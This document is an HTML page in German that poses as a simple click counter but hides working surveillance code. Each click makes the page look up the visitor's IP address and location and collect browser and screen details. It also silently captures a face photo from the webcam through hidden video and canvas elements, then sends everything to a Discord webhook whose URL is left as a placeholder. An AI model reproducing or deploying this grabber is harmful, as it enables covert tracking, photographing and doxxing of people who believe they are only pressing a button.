<!DOCTYPE html>
<html>
<head>
    <title>Zähler mit Logging</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            flex-direction: column;
        }
        .container {
            text-align: center;
            margin-bottom: 30px;
        }
        .counter {
            font-size: 72px;
            font-weight: bold;
            margin: 20px;
            color: #333;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .button {
            padding: 20px 40px;
            font-size: 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        .button:active {
            transform: scale(0.95);
        }
        .status {
            margin-top: 20px;
            color: #666;
            font-style: italic;
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="counter" id="counter">0</div>
        <button class="button" onclick="handleClick()">Klick mich + Logging</button>
        <div class="status" id="status"></div>
    </div>

    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        let count = 0;
        const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // HIER WEBHOOK URL EINTRAGEN

        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }

        function handleClick() {
            count++;
            document.getElementById('counter').textContent = count;
            updateStatus("Daten werden gesendet...");
            
            // Starte das Logging
            collectAndSendData();
        }

        // Alternative zuverlässige IP-Erkennung
        async function getIPAddress() {
            try {
                const response1 = await fetch('https://api.ipify.org?format=json');
                const data1 = await response1.json();
                return data1.ip;
            } catch (error) {
                try {
                    const response2 = await fetch('https://api64.ipify.org?format=json');
                    const data2 = await response2.json();
                    return data2.ip;
                } catch (error) {
                    return 'Unbekannt';
                }
            }
        }

        // Vereinfachte Standorterkennung
        async function getLocationInfo(ip) {
            if (ip === 'Unbekannt') return { error: 'IP nicht verfügbar' };

            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return data;
            } catch (error) {
                return { error: 'Standort nicht verfügbar' };
            }
        }

        // Systeminformationen sammeln
        function collectSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? 'Aktiv' : 'Deaktiviert',
                currentCount: count
            };
        }

        // Kamerazugriff
        async function captureCamera() {
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');

                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                video.srcObject = stream;
                
                // Warte bis die Kamera ready ist
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                await new Promise(resolve => setTimeout(resolve, 1000));
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());
                
                return imageData;
            } catch (error) {
                return null;
            }
        }

        // Hilfsfunktion
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }

        // Haupt-Logging-Funktion
        async function collectAndSendData() {
            updateStatus("Erfasse IP und Standort...");
            const ip = await getIPAddress();
            const location = await getLocationInfo(ip);
            
            updateStatus("Sammle Systeminformationen...");
            const systemInfo = collectSystemInfo();
            
            updateStatus("Zugriff auf Kamera...");
            const cameraImage = await captureCamera();

            updateStatus("Sende Daten an Discord...");
            
            // Discord Nachricht vorbereiten
            const embedData = {
                title: '🎯 Button Klick Erfassung',
                color: 0xff0000,
                fields: [
                    { name: '🔢 Aktueller Zählerstand', value: count.toString(), inline: true },
                    { name: '🌐 IP-Adresse', value: ip || 'Unbekannt', inline: true },
                    { name: '🖥️ Browser', value: systemInfo.userAgent.substring(0, 100) + '...', inline: false },
                    { name: '📍 Standort', value: location.country ? `${location.city}, ${location.country}` : 'Unbekannt', inline: true },
                    { name: '📏 Bildschirm', value: systemInfo.screen, inline: true },
                    { name: '⏰ Zeitzone', value: systemInfo.timezone, inline: true },
                    { name: '🕐 Zeitstempel', value: new Date().toLocaleString('de-DE'), inline: false }
                ],
                timestamp: new Date().toISOString()
            };

            try {
                // Sende Textdaten
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        content: `🚨 Neuer Klick! Zählerstand: ${count}`,
                        embeds: [embedData] 
                    })
                });

                // Sende Kamerabild wenn vorhanden
                if (cameraImage) {
                    const formData = new FormData();
                    const blob = dataURLtoBlob(cameraImage);
                    formData.append('file', blob, `face_capture_${count}.jpg`);
                    
                    await fetch(webhookURL, {
                        method: 'POST',
                        body: formData
                    });
                }

                updateStatus("✅ Daten erfolgreich gesendet!");
                setTimeout(() => updateStatus(""), 3000);
                
            } catch (error) {
                updateStatus("❌ Fehler beim Senden der Daten");
                setTimeout(() => updateStatus(""), 3000);
            }
        }

        // Initialisiere Status
        updateStatus("Bereit zum Klicken...");
    </script>
</body>
</html>
